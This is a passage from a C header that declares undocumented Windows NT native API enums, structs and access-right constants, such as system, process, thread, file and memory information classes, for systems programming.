} INTERFACE_TYPE ;

typedef struct _SYSDBG_IO_SPACE
{
	ULONG64 Address;
	PVOID Buffer;
	ULONG Request;
	enum _INTERFACE_TYPE InterfaceType;
	ULONG BusNumber;
	ULONG AddressSpace;
} SYSDBG_IO_SPACE, *PSYSDBG_IO_SPACE;

typedef struct _SYSDBG_MSR
{
	ULONG Msr;
	ULONG64 Data;
} SYSDBG_MSR, *PSYSDBG_MSR;

typedef enum _BUS_DATA_TYPE
{
    ConfigurationSpaceUndefined = -1,
    Cmos,
    EisaConfiguration,
    Pos,
    CbusConfiguration,
    PCIConfiguration,
    VMEConfiguration,
    NuBusConfiguration,
    PCMCIAConfiguration,
    MPIConfiguration,
    MPSAConfiguration,
    PNPISAConfiguration,
    SgiInternalConfiguration,
    MaximumBusDataType
} BUS_DATA_TYPE, *PBUS_DATA_TYPE;

typedef struct _SYSDBG_BUS_DATA
{
	ULONG Address;
	PVOID Buffer;
	ULONG Request;
	enum _BUS_DATA_TYPE BusDataType;
	ULONG BusNumber;
	ULONG SlotNumber;
} SYSDBG_BUS_DATA, *PSYSDBG_BUS_DATA;

typedef struct _SYSDBG_TRIAGE_DUMP
{
	ULONG Flags;
	ULONG BugCheckCode;
	ULONG_PTR BugCheckParam1;
	ULONG_PTR BugCheckParam2;
	ULONG_PTR BugCheckParam3;
	ULONG_PTR BugCheckParam4;
	ULONG ProcessHandles;
	ULONG ThreadHandles;
	PHANDLE Handles;
} SYSDBG_TRIAGE_DUMP, *PSYSDBG_TRIAGE_DUMP;

typedef enum _SYSTEM_INFORMATION_CLASS
{
	SystemBasicInformation,
	SystemProcessorInformation,
	SystemPerformanceInformation,
	SystemTimeOfDayInformation,
	SystemPathInformation,
	SystemProcessInformation,
	SystemCallCountInformation,
	SystemDeviceInformation,
	SystemProcessorPerformanceInformation,
	SystemFlagsInformation,
	SystemCallTimeInformation,
	SystemModuleInformation,
	SystemLocksInformation,
	SystemStackTraceInformation,
	SystemPagedPoolInformation,
	SystemNonPagedPoolInformation,
	SystemHandleInformation,
	SystemObjectInformation,
	SystemPageFileInformation,
	SystemVdmInstemulInformation,
	SystemVdmBopInformation,
	SystemFileCacheInformation,
	SystemPoolTagInformation,
	SystemInterruptInformation,
	SystemDpcBehaviorInformation,
	SystemFullMemoryInformation,
	SystemLoadGdiDriverInformation,
	SystemUnloadGdiDriverInformation,
	SystemTimeAdjustmentInformation,
	SystemSummaryMemoryInformation,
	SystemMirrorMemoryInformation,
	SystemPerformanceTraceInformation,
	SystemObsolete0,
	SystemExceptionInformation,
	SystemCrashDumpStateInformation,
	SystemKernelDebuggerInformation,
	SystemContextSwitchInformation,
	SystemRegistryQuotaInformation,
	SystemExtendServiceTableInformation,
	SystemPrioritySeperation,
	SystemVerifierAddDriverInformation,
	SystemVerifierRemoveDriverInformation,
	SystemProcessorIdleInformation,
	SystemLegacyDriverInformation,
	SystemCurrentTimeZoneInformation,
	SystemLookasideInformation,
	SystemTimeSlipNotification,
	SystemSessionCreate,
	SystemSessionDetach,
	SystemSessionInformation,
	SystemRangeStartInformation,
	SystemVerifierInformation,
	SystemVerifierThunkExtend,
	SystemSessionProcessInformation,
	SystemLoadGdiDriverInSystemSpace,
	SystemNumaProcessorMap,
	SystemPrefetcherInformation,
	SystemExtendedProcessInformation,
	SystemRecommendedSharedDataAlignment,
	SystemComPlusPackage,
	SystemNumaAvailableMemory,
	SystemProcessorPowerInformation,
	SystemEmulationBasicInformation,				// WOW64
	SystemEmulationProcessorInformation,		// WOW64
	SystemExtendedHandleInformation,
	SystemLostDelayedWriteInformation,
	SystemBigPoolInformation,
	SystemSessionPoolTagInformation,
	SystemSessionMappedViewInformation,
	SystemHotpatchInformation,
	SystemObjectSecurityMode,
	SystemWatchdogTimerHandler,
	SystemWatchdogTimerInformation,
	SystemLogicalProcessorInformation,
	SystemWow64SharedInformation,
	SystemRegisterFirmwareTableInformationHandler,
	SystemFirmwareTableInformation,
	SystemModuleInformationEx,
	SystemVerifierTriageInformation,
	SystemSuperfetchInformation,
	SystemMemoryListInformation,
	SystemFileCacheInformationEx,
	SystemThreadPriorityClientIdInformation,
	SystemProcessorIdleCycleTimeInformation,
	SystemVerifierCancellationInformation,
	SystemProcessorPowerInformationEx,
	SystemRefTraceInformation,
	SystemSpecialPoolInformation,
	SystemProcessIdInformation,
	SystemErrorPortInformation,
	SystemBootEnvironmentInformation,
	SystemHypervisorInformation,
	SystemVerifierInformationEx,
	SystemTimeZoneInformation,
	SystemImageFileExecutionOptionsInformation,
	SystemCoverageInformation,
	SystemPrefetchPatchInformation,
	SystemVerifierFaultsInformation,
	SystemSystemPartitionInformation,
	SystemSystemDiskInformation,
	SystemProcessorPerformanceDistribution,
	SystemNumaProximityNodeInformation,
	SystemDynamicTimeZoneInformation,
	SystemCodeIntegrityInformation,
	SystemProcessorMicrocodeUpdateInformation,
	SystemProcessorBrandString,
	SystemVirtualAddressInformation,
	MaxSystemInfoClass
} SYSTEM_INFORMATION_CLASS, *PSYSTEM_INFORMATION_CLASS;

typedef enum _EVENT_TRACE_INFORMATION_CLASS
{
	EventTraceKernelVersionInformation,
	EventTraceGroupMaskInformation,
	EventTracePerformanceInformation,
	EventTraceTimeProfileInformation,
	EventTraceSessionSecurityInformation,
	MaxEventTraceInfoClass
} EVENT_TRACE_INFORMATION_CLASS, *PEVENT_TRACE_INFORMATION_CLASS;

#define LOCK_QUEUE_WAIT 1
#define LOCK_QUEUE_WAIT_BIT 0

#define LOCK_QUEUE_OWNER 2
#define LOCK_QUEUE_OWNER_BIT 1

#define LOCK_QUEUE_TIMER_LOCK_SHIFT 4
#define LOCK_QUEUE_TIMER_TABLE_LOCKS (1 << (8 - LOCK_QUEUE_TIMER_LOCK_SHIFT))

typedef enum _KSPIN_LOCK_QUEUE_NUMBER {
	LockQueueDispatcherLock,
	LockQueueUnusedSpare1,
	LockQueuePfnLock,
	LockQueueSystemSpaceLock,
	LockQueueVacbLock,
	LockQueueMasterLock,
	LockQueueNonPagedPoolLock,
	LockQueueIoCancelLock,
	LockQueueWorkQueueLock,
	LockQueueIoVpbLock,
	LockQueueIoDatabaseLock,
	LockQueueIoCompletionLock,
	LockQueueNtfsStructLock,
	LockQueueAfdWorkQueueLock,
	LockQueueBcbLock,
	LockQueueMmNonPagedPoolLock,
	LockQueueUnusedSpare16,
	LockQueueTimerTableLock,
	LockQueueMaximumLock = LockQueueTimerTableLock + LOCK_QUEUE_TIMER_TABLE_LOCKS
} KSPIN_LOCK_QUEUE_NUMBER, *PKSPIN_LOCK_QUEUE_NUMBER;

typedef enum _KPROFILE_SOURCE {
	ProfileTime,
	ProfileAlignmentFixup,
	ProfileTotalIssues,
	ProfilePipelineDry,
	ProfileLoadInstructions,
	ProfilePipelineFrozen,
	ProfileBranchInstructions,
	ProfileTotalNonissues,
	ProfileDcacheMisses,
	ProfileIcacheMisses,
	ProfileCacheMisses,
	ProfileBranchMispredictions,
	ProfileStoreInstructions,
	ProfileFpInstructions,
	ProfileIntegerInstructions,
	Profile2Issue,
	Profile3Issue,
	Profile4Issue,
	ProfileSpecialInstructions,
	ProfileTotalCycles,
	ProfileIcacheIssues,
	ProfileDcacheAccesses,
	ProfileMemoryBarrierCycles,
	ProfileLoadLinkedIssues,
	ProfileMaximum
} KPROFILE_SOURCE;

typedef enum _PROCESSINFOCLASS
{
  ProcessBasicInformation,
  ProcessQuotaLimits,
  ProcessIoCounters,
  ProcessVmCounters,
  ProcessTimes,
  ProcessBasePriority,
  ProcessRaisePriority,
  ProcessDebugPort,
  ProcessExceptionPort,
  ProcessAccessToken,
  ProcessLdtInformation,
  ProcessLdtSize,
  ProcessDefaultHardErrorMode,
  ProcessIoPortHandlers,
  ProcessPooledUsageAndLimits,
  ProcessWorkingSetWatch,
  ProcessUserModeIOPL,
  ProcessEnableAlignmentFaultFixup,
  ProcessPriorityClass,
  ProcessWx86Information,
  ProcessHandleCount,
  ProcessAffinityMask,
  ProcessPriorityBoost,
  ProcessDeviceMap,
  ProcessSessionInformation,
  ProcessForegroundInformation,
  ProcessWow64Information,
  ProcessImageFileName,
  ProcessLUIDDeviceMapsEnabled,
  ProcessBreakOnTermination,
  ProcessDebugObjectHandle,
  ProcessDebugFlags,
  ProcessHandleTracing,
  ProcessIoPriority,
  ProcessExecuteFlags,
  ProcessTlsInformation,
  ProcessCookie,
  ProcessImageInformation,
  ProcessCycleTime,
  ProcessPagePriority,
  ProcessInstrumentationCallback,
  ProcessThreadStackAllocation,
  ProcessWorkingSetWatchEx,
  ProcessImageFileNameWin32,
  ProcessImageFileMapping,
  ProcessAffinityUpdateMode,
  ProcessMemoryAllocationMode,
	ProcessGroupInformation,
	ProcessTokenVirtualizationEnabled,
	ProcessConsoleHostProcess,
	ProcessWindowInformation,
  MaxProcessInfoClass
} PROCESSINFOCLASS;

typedef enum _THREADINFOCLASS {
	ThreadBasicInformation,
	ThreadTimes,
	ThreadPriority,
	ThreadBasePriority,
	ThreadAffinityMask,
	ThreadImpersonationToken,
	ThreadDescriptorTableEntry,
	ThreadEnableAlignmentFaultFixup,
	ThreadEventPair_Reusable,
	ThreadQuerySetWin32StartAddress,
	ThreadZeroTlsCell,
	ThreadPerformanceCount,
	ThreadAmILastThread,
	ThreadIdealProcessor,
	ThreadPriorityBoost,
	ThreadSetTlsArrayAddress,   // Obsolete
	ThreadIsIoPending,
	ThreadHideFromDebugger,
	ThreadBreakOnTermination,
	ThreadSwitchLegacyState,
	ThreadIsTerminated,
	ThreadLastSystemCall,
	ThreadIoPriority,
	ThreadCycleTime,
	ThreadPagePriority,
	ThreadActualBasePriority,
	ThreadTebInformation,
	ThreadCSwitchMon,          // Obsolete
	ThreadCSwitchPmu,
	ThreadWow64Context,
	ThreadGroupInformation,
	ThreadUmsInformation,      // UMS
	ThreadCounterProfiling,
	ThreadIdealProcessorEx,
	MaxThreadInfoClass
} THREADINFOCLASS;


typedef enum _PROCESS_TLS_INFORMATION_TYPE
{
  ProcessTlsReplaceIndex,
  ProcessTlsReplaceVector,
  MaxProcessTlsOperation
} PROCESS_TLS_INFORMATION_TYPE;


#define PROCESS_TERMINATE         (0x0001)  
#define PROCESS_CREATE_THREAD     (0x0002)  
#define PROCESS_SET_SESSIONID     (0x0004)  
#define PROCESS_VM_OPERATION      (0x0008)  
#define PROCESS_VM_READ           (0x0010)  
#define PROCESS_VM_WRITE          (0x0020)
#define PROCESS_DUP_HANDLE        (0x0040)
#define PROCESS_CREATE_PROCESS    (0x0080)  
#define PROCESS_SET_QUOTA         (0x0100)  
#define PROCESS_SET_INFORMATION   (0x0200)  
#define PROCESS_QUERY_INFORMATION (0x0400)  
#define PROCESS_SET_PORT          (0x0800)
#define PROCESS_SUSPEND_RESUME    (0x0800)  

#define NtCurrentThread() ( (HANDLE)(LONG_PTR) -2 )
#define NtCurrentProcess() ( (HANDLE)(LONG_PTR) -1 )
#define ZwCurrentProcess() NtCurrentProcess()
#define ZwCurrentThread()	 NtCurrentThread()

// 28.05.2011 - rndbit
#define NtLastError() ( NtCurrentTeb()->LastErrorValue )
#define NtLastStatus()	( NtCurrentTeb()->LastStatusValue )

#if defined(_M_X86)
#define NtCurrentPID() __readfsdword(0x20)
#else
#define NtCurrentPID() __readgsqword(0x20)
#endif

#define THREAD_TERMINATE               (0x0001)  
#define THREAD_SUSPEND_RESUME          (0x0002)  
#define THREAD_ALERT                   (0x0004)
#define THREAD_GET_CONTEXT             (0x0008)  
#define THREAD_SET_CONTEXT             (0x0010)  
#define THREAD_SET_INFORMATION         (0x0020)  
#define THREAD_QUERY_INFORMATION       (0x0040)  
#define THREAD_SET_THREAD_TOKEN        (0x0080)
#define THREAD_IMPERSONATE             (0x0100)
#define THREAD_DIRECT_IMPERSONATION    (0x0200)

#define JOB_OBJECT_ASSIGN_PROCESS						(0x0001)
#define JOB_OBJECT_SET_ATTRIBUTES						(0x0002)
#define JOB_OBJECT_QUERY										(0x0004)
#define JOB_OBJECT_TERMINATE								(0x0008)
#define JOB_OBJECT_SET_SECURITY_ATTRIBUTES  (0x0010)
#ifndef _WINNT_
#define JOB_OBJECT_ALL_ACCESS								(STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE | 0x1F )
#endif

#define PEB_STDIO_HANDLE_NATIVE     0
#define PEB_STDIO_HANDLE_SUBSYS     1
#define PEB_STDIO_HANDLE_PM         2
#define PEB_STDIO_HANDLE_RESERVED   3

#define GDI_HANDLE_BUFFER_SIZE32  34
#define GDI_HANDLE_BUFFER_SIZE64  60

#if !defined(_M_X64)
#define GDI_HANDLE_BUFFER_SIZE      GDI_HANDLE_BUFFER_SIZE32
#else
#define GDI_HANDLE_BUFFER_SIZE      GDI_HANDLE_BUFFER_SIZE64
#endif

typedef ULONG GDI_HANDLE_BUFFER32[GDI_HANDLE_BUFFER_SIZE32];
typedef ULONG GDI_HANDLE_BUFFER64[GDI_HANDLE_BUFFER_SIZE64];
typedef ULONG GDI_HANDLE_BUFFER[GDI_HANDLE_BUFFER_SIZE];

#define FOREGROUND_BASE_PRIORITY  9
#define NORMAL_BASE_PRIORITY      8

#ifndef FILE_READ_ACCESS
#define FILE_READ_ACCESS ( 0x0001 )
#endif

typedef enum _FILE_INFORMATION_CLASS
{
  FileDirectoryInformation = 1,
  FileFullDirectoryInformation,
  FileBothDirectoryInformation,
  FileBasicInformation,
  FileStandardInformation,
  FileInternalInformation,
  FileEaInformation,
  FileAccessInformation,
  FileNameInformation,
  FileRenameInformation,
  FileLinkInformation,
  FileNamesInformation,
  FileDispositionInformation,
  FilePositionInformation,
  FileFullEaInformation,
  FileModeInformation,
  FileAlignmentInformation,
  FileAllInformation,
  FileAllocationInformation,
  FileEndOfFileInformation,
  FileAlternateNameInformation,
  FileStreamInformation,
  FilePipeInformation,
  FilePipeLocalInformation,
  FilePipeRemoteInformation,
  FileMailslotQueryInformation,
  FileMailslotSetInformation,
  FileCompressionInformation,
  FileObjectIdInformation,
  FileCompletionInformation,
  FileMoveClusterInformation,
  FileQuotaInformation,
  FileReparsePointInformation,
  FileNetworkOpenInformation,
  FileAttributeTagInformation,
  FileTrackingInformation,
  FileIdBothDirectoryInformation,
  FileIdFullDirectoryInformation,
  FileValidDataLengthInformation,
  FileShortNameInformation,
  FileIoCompletionNotificationInformation,
  FileIoStatusBlockRangeInformation,
  FileIoPriorityHintInformation,
  FileSfioReserveInformation,
  FileSfioVolumeInformation,
  FileHardLinkInformation,
  FileProcessIdsUsingFileInformation,
  FileNormalizedNameInformation,
  FileNetworkPhysicalNameInformation,
  FileIdGlobalTxDirectoryInformation,
  FileMaximumInformation
} FILE_INFORMATION_CLASS, *PFILE_INFORMATION_CLASS;

typedef enum _FSINFOCLASS {
	FileFsVolumeInformation = 1,
	FileFsLabelInformation,
	FileFsSizeInformation,
	FileFsDeviceInformation,
	FileFsAttributeInformation,
	FileFsControlInformation,
	FileFsFullSizeInformation,
	FileFsObjectIdInformation,
	FileFsDriverPathInformation,
	FileFsVolumeFlagsInformation,
	FileFsMaximumInformation
} FS_INFORMATION_CLASS, *PFS_INFORMATION_CLASS;

typedef enum _POOL_TYPE {
	NonPagedPool,
	PagedPool,
	NonPagedPoolMustSucceed,
	DontUseThisType,
	NonPagedPoolCacheAligned,
	PagedPoolCacheAligned,
	NonPagedPoolCacheAlignedMustS,
	MaxPoolType,
	NonPagedPoolSession,
	PagedPoolSession,
	NonPagedPoolMustSucceedSession,
	DontUseThisTypeSession,
	NonPagedPoolCacheAlignedSession,
	PagedPoolCacheAlignedSession,
	NonPagedPoolCacheAlignedMustSSession
} POOL_TYPE, *PPOOL_TYPE;

typedef enum _MEMORY_INFORMATION_CLASS
{
	MemoryBasicInformation,
	MemoryWorkingSetInformation,
	MemoryMappedFilenameInformation,
	MemoryRegionInformation,
	MemoryWorkingSetExInformation
} MEMORY_INFORMATION_CLASS, *PMEMORY_INFORMATION_CLASS;

typedef enum _REG_NOTIFY_CLASS
{
  RegNtDeleteKey,
  RegNtPreDeleteKey,
  RegNtSetValueKey,
  RegNtPreSetValueKey,
  RegNtDeleteValueKey,
  RegNtPreDeleteValueKey,
  RegNtSetInformationKey,
  RegNtPreSetInformationKey,
  RegNtRenameKey,
  RegNtPreRenameKey,
  RegNtEnumerateKey,
  RegNtPreEnumerateKey,
  RegNtEnumerateValueKey,
  RegNtPreEnumerateValueKey,
  RegNtQueryKey,
  RegNtPreQueryKey,
  RegNtQueryValueKey,
  RegNtPreQueryValueKey,
  RegNtQueryMultipleValueKey,
  RegNtPreQueryMultipleValueKey,
  RegNtPreCreateKey,
  RegNtPostCreateKey,
  RegNtPreOpenKey,
  RegNtPostOpenKey,
  RegNtKeyHandleClose,
  RegNtPreKeyHandleClose,
  RegNtPostDeleteKey,
  RegNtPostSetValueKey,
  RegNtPostDeleteValueKey,
  RegNtPostSetInformationKey,
  RegNtPostRenameKey,
  RegNtPostEnumerateKey,
  RegNtPostEnumerateValueKey,
  RegNtPostQueryKey,
  RegNtPostQueryValueKey,
  RegNtPostQueryMultipleValueKey,
  RegNtPostKeyHandleClose,
  RegNtPreCreateKeyEx,
  RegNtPostCreateKeyEx,
  RegNtPreOpenKeyEx,
  RegNtPostOpenKeyEx,
  RegNtPreFlushKey,
  RegNtPostFlushKey,
  RegNtPreLoadKey,
  RegNtPostLoadKey,
  RegNtPreUnLoadKey,
  RegNtPostUnLoadKey,
  RegNtPreQueryKeySecurity,
  RegNtPostQueryKeySecurity,
  RegNtPreSetKeySecurity,
  RegNtPostSetKeySecurity,
  RegNtCallbackObjectContextCleanup,
  MaxRegNtNotifyClass
} REG_NOTIFY_CLASS, *PREG_NOTIFY_CLASS;

typedef enum _HAL_QUERY_INFORMATION_CLASS
{
  HalInstalledBusInformation,
  HalProfileSourceInformation,
  HalInformationClassUnused1,
  HalPowerInformation,
  HalProcessorSpeedInformation,
  HalCallbackInformation,
  HalMapRegisterInformation,
  HalMcaLogInformation,
  HalFrameBufferCachingInformation,
  HalDisplayBiosInformation,
  HalProcessorFeatureInformation,
  HalNumaTopologyInterface,
  HalErrorInformation,
  HalCmcLogInformation,
  HalCpeLogInformation,
  HalQueryMcaInterface,
  HalQueryAMLIIllegalIOPortAddresses,
  HalQueryMaxHotPlugMemoryAddress,
  HalPartitionIpiInterface,
  HalPlatformInformation,
  HalQueryProfileSourceList,
  HalInitLogInformation,
  HalFrequencyInformation,
  HalProcessorBrandString
} HAL_QUERY_INFORMATION_CLASS, *PHAL_QUERY_INFORMATION_CLASS;


#if defined(_WINNT_) && (_MSC_VER < 1300) && !defined(_WINDOWS_)
typedef enum POWER_INFORMATION_LEVEL {
  SystemPowerPolicyAc = 0x0,
  SystemPowerPolicyDc = 0x1,
  VerifySystemPolicyAc = 0x2,
  VerifySystemPolicyDc = 0x3,
  SystemPowerCapabilities = 0x4,
  SystemBatteryState = 0x5,
  SystemPowerStateHandler = 0x6,
  ProcessorStateHandler = 0x7,
  SystemPowerPolicyCurrent = 0x8,
  AdministratorPowerPolicy = 0x9,
  SystemReserveHiberFile = 0xa,
  ProcessorInformation = 0xb,
  SystemPowerInformation = 0xc,
  ProcessorStateHandler2 = 0xd,
  LastWakeTime = 0xe,
  LastSleepTime = 0xf,
  SystemExecutionState = 0x10,
  SystemPowerStateNotifyHandler = 0x11,
  ProcessorPowerPolicyAc = 0x12,
  ProcessorPowerPolicyDc = 0x13,
  VerifyProcessorPowerPolicyAc = 0x14,
  VerifyProcessorPowerPolicyDc = 0x15,
  ProcessorPowerPolicyCurrent = 0x16,
  SystemPowerStateLogging = 0x17,
  SystemPowerLoggingEntry = 0x18,
  SetPowerSettingValue = 0x19,
  NotifyUserPowerSetting = 0x1a,
  GetPowerTransitionVetoes = 0x1b,
  SetPowerTransitionVeto = 0x1c,
  SystemVideoState = 0x1d,
  TraceApplicationPowerMessage = 0x1e,
  TraceApplicationPowerMessageEnd = 0x1f,
  ProcessorPerfStates = 0x20,
  ProcessorIdleStates = 0x21,
  ProcessorThrottleStates = 0x22,
  SystemWakeSource = 0x23,
  SystemHiberFileInformation = 0x24,
  TraceServicePowerMessage = 0x25,
  ProcessorLoad = 0x26,
  PowerShutdownNotification = 0x27,
  MonitorCapabilities = 0x28
};
#endif

typedef struct _IO_STATUS_BLOCK {
	union {
		NTSTATUS Status;
		PVOID Pointer;
	};
	ULONG_PTR Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;

typedef VOID(NTAPI *PIO_APC_ROUTINE)(
	IN PVOID ApcContext,
	IN PIO_STATUS_BLOCK IoStatusBlock,
	IN ULONG Reserved
	);

typedef struct _X86_FLOATING_SAVE_AREA
{
	ULONG ControlWord;
	ULONG StatusWord;
	ULONG TagWord;
	ULONG ErrorOffset;
	ULONG ErrorSelector;
	ULONG DataOffset;
	ULONG DataSelector;
	UCHAR RegisterArea[ 80 ];
	ULONG Cr0NpxState;
} X86_FLOATING_SAVE_AREA, *PX86_FLOATING_SAVE_AREA;

typedef struct _X86_CONTEXT
{
	ULONG ContextFlags;
	ULONG Dr0;
	ULONG Dr1;
	ULONG Dr2;
	ULONG Dr3;
	ULONG Dr6;
	ULONG Dr7;
	X86_FLOATING_SAVE_AREA FloatSave;
	ULONG SegGs;
	ULONG SegFs;
	ULONG SegEs;
	ULONG SegDs;
	ULONG Edi;
	ULONG Esi;
	ULONG Ebx;
	ULONG Edx;
	ULONG Ecx;
	ULONG Eax;
	ULONG Ebp;
	ULONG Eip;
	ULONG SegCs;
	ULONG EFlags;
	ULONG Esp;
	ULONG SegSs;
} X86_CONTEXT, *PX86_CONTEXT;

#define FILE_SUPERSEDE                  0x00000000
#define FILE_OPEN                       0x00000001
#define FILE_CREATE                     0x00000002
#define FILE_OPEN_IF                    0x00000003
#define FILE_OVERWRITE                  0x00000004
#define FILE_OVERWRITE_IF               0x00000005
#define FILE_MAXIMUM_DISPOSITION        0x00000005

#define FILE_DIRECTORY_FILE                     0x00000001
#define FILE_WRITE_THROUGH                      0x00000002
#define FILE_SEQUENTIAL_ONLY                    0x00000004
#define FILE_NO_INTERMEDIATE_BUFFERING          0x00000008

#define FILE_SYNCHRONOUS_IO_ALERT               0x00000010
#define FILE_SYNCHRONOUS_IO_NONALERT            0x00000020
#define FILE_NON_DIRECTORY_FILE                 0x00000040
#define FILE_CREATE_TREE_CONNECTION             0x00000080

#define FILE_COMPLETE_IF_OPLOCKED               0x00000100
#define FILE_NO_EA_KNOWLEDGE                    0x00000200
#define FILE_OPEN_FOR_RECOVERY                  0x00000400
#define FILE_RANDOM_ACCESS                      0x00000800

#define FILE_DELETE_ON_CLOSE                    0x00001000
#define FILE_OPEN_BY_FILE_ID                    0x00002000
#define FILE_OPEN_FOR_BACKUP_INTENT             0x00004000
#define FILE_NO_COMPRESSION                     0x00008000

#define FILE_RESERVE_OPFILTER                   0x00100000
#define FILE_OPEN_REPARSE_POINT                 0x00200000
#define FILE_OPEN_NO_RECALL                     0x00400000
#define FILE_OPEN_FOR_FREE_SPACE_QUERY          0x00800000


#define FILE_COPY_STRUCTURED_STORAGE            0x00000041
#define FILE_STRUCTURED_STORAGE                 0x00000441

#define FILE_VALID_OPTION_FLAGS                 0x00ffffff
#define FILE_VALID_PIPE_OPTION_FLAGS            0x00000032
#define FILE_VALID_MAILSLOT_OPTION_FLAGS        0x00000032
#define FILE_VALID_SET_FLAGS                    0x00000036

#define WIN32_CLIENT_INFO_LENGTH 62

#define PIO_APC_ROUTINE_DEFINED

typedef struct _PORT_VIEW {
	ULONG Length;
	LPC_HANDLE SectionHandle;
	ULONG SectionOffset;
	LPC_SIZE_T ViewSize;
	LPC_PVOID ViewBase;
	LPC_PVOID ViewRemoteBase;
} PORT_VIEW, *PPORT_VIEW;

typedef struct _REMOTE_PORT_VIEW {
	ULONG Length;
	LPC_SIZE_T ViewSize;
	LPC_PVOID ViewBase;
} REMOTE_PORT_VIEW, *PREMOTE_PORT_VIEW;

#define IO_COMPLETION_QUERY_STATE   0x0001
#define IO_COMPLETION_MODIFY_STATE  0x0002  
#define IO_COMPLETION_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED|SYNCHRONIZE|0x3) 

typedef enum _IO_COMPLETION_INFORMATION_CLASS {
	IoCompletionBasicInformation
} IO_COMPLETION_INFORMATION_CLASS;

typedef enum _PORT_INFORMATION_CLASS {
	PortBasicInformation
} PORT_INFORMATION_CLASS;

typedef enum _SECTION_INHERIT {
	ViewShare = 1,
	ViewUnmap = 2
} SECTION_INHERIT;

//added 21/03/2011
typedef struct _MEMORY_WORKING_SET_BLOCK
{
	ULONG_PTR Protection : 5;
	ULONG_PTR ShareCount : 3;
	ULONG_PTR Shared : 1;
	ULONG_PTR Node : 3;
#if defined(_M_X64)
	ULONG_PTR VirtualPage : 52;
#else
	ULONG VirtualPage : 20;
#endif
} MEMORY_WORKING_SET_BLOCK, *PMEMORY_WORKING_SET_BLOCK;

typedef struct _MEMORY_WORKING_SET_INFORMATION
{
	ULONG_PTR NumberOfEntries;
	MEMORY_WORKING_SET_BLOCK WorkingSetInfo[1];
} MEMORY_WORKING_SET_INFORMATION, *PMEMORY_WORKING_SET_INFORMATION;

typedef struct _MEMORY_WORKING_SET_EX_BLOCK
{
	ULONG_PTR Valid : 1;
	ULONG_PTR ShareCount : 3;
	ULONG_PTR Win32Protection : 11;
	ULONG_PTR Shared : 1;
	ULONG_PTR Node : 6;
	ULONG_PTR Locked : 1;
	ULONG_PTR LargePage : 1;
	ULONG_PTR Priority : 3;
	ULONG_PTR Reserved : 5;

#if defined(_M_X64)
	ULONG_PTR ReservedUlong : 32;
#endif
} MEMORY_WORKING_SET_EX_BLOCK, *PMEMORY_WORKING_SET_EX_BLOCK;

typedef struct _MEMORY_REGION_INFORMATION
{
	PVOID AllocationBase;
	ULONG AllocationProtect;
	ULONG RegionType;
	SIZE_T RegionSize;
} MEMORY_REGION_INFORMATION, *PMEMORY_REGION_INFORMATION;

typedef struct _MEMORY_WORKING_SET_EX_INFORMATION
{
	PVOID VirtualAddress;
	union
	{
		MEMORY_WORKING_SET_EX_BLOCK VirtualAttributes;
		ULONG Long;
	};
} MEMORY_WORKING_SET_EX_INFORMATION, *PMEMORY_WORKING_SET_EX_INFORMATION;

typedef
VOID
(*PTIMER_APC_ROUTINE) (
    IN PVOID TimerContext,
    IN ULONG TimerLowValue,
    IN LONG TimerHighValue
    );

typedef enum _SHUTDOWN_ACTION {
	ShutdownNoReboot,
	ShutdownReboot,
	ShutdownPowerOff
} SHUTDOWN_ACTION;

typedef enum _ATOM_INFORMATION_CLASS
{
	AtomBasicInformation,
	AtomTableInformation
} ATOM_INFORMATION_CLASS;

typedef struct _ATOM_BASIC_INFORMATION
{
	USHORT UsageCount;
	USHORT Flags;
	USHORT NameLength;
	WCHAR Name[1];
} ATOM_BASIC_INFORMATION, *PATOM_BASIC_INFORMATION;

typedef struct _ATOM_TABLE_INFORMATION
{
	ULONG NumberOfAtoms;
	RTL_ATOM Atoms[1];
} ATOM_TABLE_INFORMATION, *PATOM_TABLE_INFORMATION;

#define SEMAPHORE_QUERY_STATE       0x0001
#define SEMAPHORE_MODIFY_STATE      0x0002

#define SEMAPHORE_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED|SYNCHRONIZE|0x3)

typedef enum _SEMAPHORE_INFORMATION_CLASS {
	SemaphoreBasicInformation
} SEMAPHORE_INFORMATION_CLASS;

typedef struct _SEMAPHORE_BASIC_INFORMATION {
	LONG CurrentCount;
	LONG MaximumCount;
} SEMAPHORE_BASIC_INFORMATION, *PSEMAPHORE_BASIC_INFORMATION;

#define MUTANT_QUERY_STATE      0x0001

#define MUTANT_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED|SYNCHRONIZE|\
	MUTANT_QUERY_STATE)

typedef enum _MUTANT_INFORMATION_CLASS {
	MutantBasicInformation
} MUTANT_INFORMATION_CLASS;

typedef struct _MUTANT_BASIC_INFORMATION {
	LONG CurrentCount;
	BOOLEAN OwnedByCaller;
	BOOLEAN AbandonedState;
} MUTANT_BASIC_INFORMATION, *PMUTANT_BASIC_INFORMATION;

#define TIMER_QUERY_STATE       0x0001
#define TIMER_MODIFY_STATE      0x0002

#define TIMER_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED|SYNCHRONIZE|\
	TIMER_QUERY_STATE|TIMER_MODIFY_STATE)
typedef enum _TIMER_INFORMATION_CLASS {
	TimerBasicInformation
} TIMER_INFORMATION_CLASS;

typedef struct _TIMER_BASIC_INFORMATION {
	LARGE_INTEGER RemainingTime;
	BOOLEAN TimerState;
} TIMER_BASIC_INFORMATION, *PTIMER_BASIC_INFORMATION;

typedef enum _SECTION_INFORMATION_CLASS {
	SectionBasicInformation,
	SectionImageInformation,
	MaxSectionInfoClass
} SECTION_INFORMATION_CLASS;

#define OBJ_NAME_PATH_SEPARATOR ((WCHAR)L'\\')
#define OBJ_MAX_REPARSE_ATTEMPTS 32
#define OBJECT_TYPE_CREATE (0x0001)
#define OBJECT_TYPE_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | 0x1)

#define DIRECTORY_QUERY                 (0x0001)
#define DIRECTORY_TRAVERSE              (0x0002)
#define DIRECTORY_CREATE_OBJECT         (0x0004)
#define DIRECTORY_CREATE_SUBDIRECTORY   (0x0008)

#define DIRECTORY_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | 0xF)
#define SYMBOLIC_LINK_QUERY (0x0001)
#define SYMBOLIC_LINK_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | 0x1)

typedef enum _OBJECT_INFORMATION_CLASS {
	ObjectBasicInformation,
	ObjectNameInformation,
	ObjectTypeInformation,
	ObjectTypesInformation,
	ObjectHandleFlagInformation,
	ObjectSessionInformation,
	MaxObjectInfoClass
